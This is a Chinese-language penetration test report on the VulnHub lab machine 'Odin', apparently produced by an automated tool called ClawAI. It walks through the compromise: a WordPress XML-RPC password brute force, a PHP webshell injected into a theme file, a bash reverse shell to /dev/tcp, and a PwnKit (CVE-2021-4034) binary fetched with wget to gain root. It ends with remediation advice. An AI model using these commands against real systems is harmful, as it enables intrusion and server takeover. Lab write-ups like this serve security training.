# Odin 靶机渗透测试报告

**靶机来源**: VulnHub - Odin  
**靶机IP**: 192.168.23.135  
**操作系统**: Ubuntu 20.04 LTS (kernel 5.4.0-26-generic)  
**Hostname**: osboxes  
**渗透日期**: 2026-04-12  
**测试工具**: ClawAI 自动化渗透系统

---

## 目录

1. [信息收集](#信息收集)
2. [漏洞发现](#漏洞发现)
3. [漏洞利用 - 获取初始Shell](#漏洞利用---获取初始shell)
4. [权限提升 - CVE-2021-4034 (PwnKit)](#权限提升---cve-2021-4034-pwnkit)
5. [Root Flag 获取](#root-flag-获取)
6. [攻击路径总结](#攻击路径总结)

---

## 信息收集

### 端口扫描

```bash
nmap -sV -sC -p- 192.168.23.135
```

**扫描结果**:
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: odin
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

**发现**: 只有80端口开放，运行 WordPress 5.5.3。

### Web 应用分析

访问 `http://odin/`，发现：
- **CMS**: WordPress 5.5.3
- **主题**: Twenty Twenty
- **插件**: `stop-user-enumeration`（阻止标准用户枚举）

### WordPress 用户枚举

由于安装了 `stop-user-enumeration` 插件，标准的 `/wp-json/wp/v2/users` 接口返回 404。

**绕过方法**: 通过分析评论区 HTML 类名发现用户名：
```html
<div class="comment-author-admin">
```

确认用户名为 `admin`（WordPress 显示名为 "odin"）。

### 密码爆破

通过 WordPress XML-RPC 接口进行密码爆破：

```bash
curl -s http://odin/xmlrpc.php -d \
  '<methodCall><methodName>wp.getUsersBlogs</methodName>
   <params><param><value>admin</value></param>
   <param><value>qwerty</value></param></params>
   </methodCall>'
```

**结果**: 成功登录，凭据为 `admin / qwerty`。

### 隐写信息分析

博客第5篇文章包含 Brainfuck 编码内容：
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>---.>++++++++++..+++.<++.>--.
```

解码为 `notlmro`。

另有 Base64 提示：`If you look closely, you won't need it here`（提示无需此密码直接利用 WordPress）。

---

## 漏洞发现

### WordPress 主题文件编辑器 RCE

登录 WordPress 管理后台 (admin/qwerty) 后，发现：
- **外观 → 主题编辑器** 可用
- 可直接编辑 PHP 主题文件

**利用路径**: 修改 Twenty Twenty 主题的 `404.php` 文件注入 Webshell。

---

## 漏洞利用 - 获取初始Shell

### 步骤 1: 注入 Webshell

通过 WordPress 主题编辑器，在 `404.php` 中注入：

```php
<?php system($_GET["cmd"]); ?>
```

**Webshell 路径**: `http://odin/wp-content/themes/twentytwenty/404.php?cmd=`

### 步骤 2: 验证代码执行

```bash
curl "http://odin/wp-content/themes/twentytwenty/404.php?cmd=id"
# 输出: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 步骤 3: 获取反弹 Shell

```bash
# 攻击机监听
nc -lvnp 4445

# 触发反弹 Shell
# Payload: bash -i >& /dev/tcp/192.168.23.1/4445 0>&1
curl "http://odin/wp-content/themes/twentytwenty/404.php?cmd=bash+-c+'echo+YmFzaCAtaSA..."
```

**获得**: `www-data@osboxes` 低权限 Shell。

### 用户信息

```bash
cat /etc/passwd | grep -v nologin
# 用户: osboxes, voldemort, rockyou

# 通过 su 切换到 rockyou 用户（密码: rockyou）
su rockyou  # 密码: rockyou
```

---

## 权限提升 - CVE-2021-4034 (PwnKit)

### 漏洞检测

```bash
pkexec --version
# pkexec version 0.105
```

版本 0.105 受 CVE-2021-4034 (PwnKit) 影响。

### 漏洞原理

CVE-2021-4034 是 polkit 的 `pkexec` 中的本地权限提升漏洞：

1. 当 `argc=0`（空参数）时，`pkexec` 的边界检查缺失，导致越界写
2. `argv[1]`（实际上是 `envp[0]`）被写入为 `pkexec` 的路径
3. 通过 `GCONV_PATH` 环境变量，触发 GLib 消息格式化时加载恶意 `.so` 文件
4. 恶意共享库的构造函数以 SUID root 权限执行

### 利用步骤

**步骤 1**: 下载预编译利用工具

```bash
wget -O /tmp/pwnkit_bin https://github.com/ly4k/PwnKit/raw/main/PwnKit
chmod +x /tmp/pwnkit_bin
```

**步骤 2**: 在反弹 Shell 中执行

```bash
cd /tmp
./pwnkit_bin
# 输出: id
# uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

**PwnKit 成功提权到 root！**

---

## Root Flag 获取

```bash
root@osboxes:/tmp# ls /root/
bjorn  .bash_history  .bashrc  ...

root@osboxes:/tmp# cat /root/bjorn
cσηgяαтυℓαтιση

Have a nice day!

aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WaGtmblBWUXlhWQo=
```

**Root Flag**: `cσηgяαтυℓαтιση`（Unicode 编码的 "congratulation"）

---

## 攻击路径总结

```
信息收集
  └→ nmap 发现 80/TCP
     └→ WordPress 5.5.3 识别
        └→ 用户枚举绕过（分析 HTML 类名）
           └→ 爆破 admin 密码 → admin/qwerty
              └→ WordPress 主题编辑器 RCE
                 └→ 注入 Webshell (404.php)
                    └→ 获取 www-data Shell
                       └→ su rockyou (rockyou/rockyou)
                          └→ CVE-2021-4034 PwnKit 提权
                             └→ ROOT (uid=0)
                                └→ Flag: cσηgяαтυℓαтιση
```

### 关键发现

| 阶段 | 发现 | 影响 |
|------|------|------|
| 信息收集 | 仅 80 端口开放 | 减小攻击面 |
| 漏洞发现 | WordPress 主题文件可编辑 | 直接 RCE |
| 权限提升 | pkexec 0.105 (CVE-2021-4034) | 本地提权到 root |

### 修复建议

1. **WordPress 安全**: 禁用主题文件编辑器（wp-config.php 中添加 `define('DISALLOW_FILE_EDIT', true)`）
2. **弱密码**: 管理员密码 `qwerty` 过于简单，应使用强密码
3. **系统更新**: 升级 polkit 至修复版本（0.120+），修复 CVE-2021-4034
4. **最小权限**: www-data 用户不应有写入主题目录的权限

---

**报告生成**: ClawAI v1.0 自动化渗透测试系统  
**评分**: 高危 (CVSS 7.8 - CVE-2021-4034)
